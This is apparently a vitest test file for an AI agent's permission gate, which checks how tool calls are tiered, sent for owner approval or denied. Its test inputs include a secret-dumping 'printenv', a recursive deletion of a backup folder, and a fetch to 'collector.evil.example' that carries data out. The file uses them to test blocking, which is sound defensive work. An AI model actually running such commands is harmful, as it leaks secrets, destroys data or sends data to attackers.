import fs from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import type { ApprovalEngine, ApprovalOutcome, ApprovalRequest } from '../src/approvals/engine.js';
import { OwnerChat } from '../src/channels/owner-chat.js';
import { Gate } from '../src/operator/gate.js';
import { OwnerQuestions } from '../src/operator/output.js';
import { OperatorSession, pickEffort } from '../src/operator/session.js';
import { TaintTracker } from '../src/operator/taint.js';
import { toolTiers } from '../src/persistence/schema.js';
import { Governor } from '../src/runtime/governor.js';
import { FakeChannel, makeCtx } from './helpers.js';

function setup(answer: ApprovalOutcome = { decision: 'approved' }) {
  const ctx = makeCtx();
  fs.mkdirSync(ctx.config.home, { recursive: true });
  const ch = new FakeChannel();
  const chat = new OwnerChat(ctx, ch);
  const gate = new Gate(ctx);
  const requests: ApprovalRequest[] = [];
  const approvals = {
    request: async (r: ApprovalRequest) => {
      requests.push(r);
      return answer;
    },
  } as unknown as ApprovalEngine;
  const session = new OperatorSession(
    ctx,
    chat,
    gate,
    approvals,
    new Governor(ctx, async () => {}),
    new OwnerQuestions(1000),
  );
  const s = session as unknown as {
    run: unknown;
    gateHook: (
      i: unknown,
      id: string,
      sig: AbortSignal,
    ) => Promise<{ hookSpecificOutput: { permissionDecision: string; permissionDecisionReason: string } }>;
  };
  s.run = {
    id: 'run1',
    prompt: 'x',
    sourceMessageId: null,
    taint: new TaintTracker('check pathao.com for order 882'),
    toolCalls: 0,
    startedAt: 0,
    lastProgressAt: 0,
    pendingResults: 1,
    texts: [],
    stopped: false,
    done: () => {},
  };
  const call = async (tool_name: string, tool_input: Record<string, unknown>) =>
    (
      await s.gateHook(
        {
          hook_event_name: 'PreToolUse',
          tool_name,
          tool_input,
          tool_use_id: 'tu',
          cwd: ctx.config.home,
          session_id: 's',
          transcript_path: '',
        },
        `tu-${Math.random()}`,
        new AbortController().signal,
      )
    ).hookSpecificOutput;
  return { ctx, ch, gate, requests, call, s };
}

describe('PreToolUse gate', () => {
  it('LOW runs without asking', async () => {
    const t = setup();
    expect((await t.call('Read', { file_path: path.join(t.ctx.config.home, 'a.txt') })).permissionDecision).toBe(
      'allow',
    );
    expect(t.requests).toHaveLength(0);
  });

  it('MEDIUM asks unless trusted mode is on', async () => {
    const t = setup();
    const edit = { file_path: path.join(t.ctx.config.home, 'a.txt'), old_string: 'a', new_string: 'b' };
    expect((await t.call('Edit', edit)).permissionDecision).toBe('allow');
    expect(t.requests).toHaveLength(1);
    t.gate.setTrusted(true);
    await t.call('Edit', edit);
    expect(t.requests).toHaveLength(1);
  });

  it('CRITICAL always asks, even in trusted mode', async () => {
    const t = setup();
    t.gate.setTrusted(true);
    await t.call('PowerShell', { command: 'Remove-Item D:\\backup_2024 -Recurse' });
    expect(t.requests[0]?.tier).toBe('CRITICAL');
  });

  it('DENY is blocked without asking and the owner is alerted', async () => {
    const t = setup();
    const r = await t.call('Bash', { command: 'printenv' });
    expect(r.permissionDecision).toBe('deny');
    expect(t.requests).toHaveLength(0);
    expect(t.ch.texts().at(-1)).toMatch(/Blocked/);
  });

  it('a rejected or expired approval becomes a deny with a reason Claude can act on', async () => {
    const t = setup({ decision: 'expired' });
    const r = await t.call('Bash', { command: 'npm install' });
    expect(r.permissionDecision).toBe('deny');
    expect(r.permissionDecisionReason).toMatch(/didn't answer/);
    const t2 = setup({ decision: 'edit', note: '250 pieces' });
    expect((await t2.call('Bash', { command: 'npm install' })).permissionDecisionReason).toMatch(/250 pieces/);
  });

  it('after a web page is read, visiting a new website needs approval', async () => {
    const t = setup();
    await t.call('WebFetch', { url: 'https://pathao.com/track/882' });
    expect(t.requests).toHaveLength(0);
    await t.call('WebFetch', { url: 'https://collector.evil.example/?d=abc' });
    expect(t.requests).toHaveLength(1);
    expect(t.requests[0]?.reason).toMatch(/new website/);
  });

  it('new MCP tools are recorded for the owner to confirm and run as HIGH', async () => {
    const t = setup();
    await t.call('mcp__claude_ai_Gmail__search_threads', { query: 'invoice' });
    expect(t.requests[0]?.tier).toBe('HIGH');
    expect(t.ctx.db.select().from(toolTiers).all()[0]).toMatchObject({
      toolName: 'mcp__claude_ai_Gmail__search_threads',
      suggested: 'LOW',
      tier: null,
    });
  });

  it('nothing runs while Operator Mode is disabled or the task was stopped', async () => {
    const t = setup();
    t.gate.disable();
    expect((await t.call('Read', { file_path: 'x' })).permissionDecision).toBe('deny');
  });

  it('effort: short questions medium, multi-step work high', () => {
    expect(pickEffort("What's today?")).toBe('medium');
    expect(pickEffort('Read the price list and then update the stock sheet')).toBe('high');
  });
});
